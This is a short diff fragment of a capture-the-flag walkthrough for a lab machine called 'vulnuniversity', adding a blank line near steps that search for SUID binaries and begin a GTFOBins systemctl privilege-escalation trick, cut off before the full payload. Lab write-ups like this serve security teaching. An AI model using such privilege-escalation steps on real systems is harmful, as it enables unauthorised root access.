@@ -237,6 +237,7 @@ $ find / -perm -4000 2>/dev/null
 We could have also used `linpeas` to find the same thing.
 
 2. Become root and get the last flag (/root/root.txt)
+
 Curtosy of GTFOBins, we can leverage `systemctl` to run commands as root like this:
 ```bash
 www-data@vulnuniversity:/$ TF=$(mktemp).service
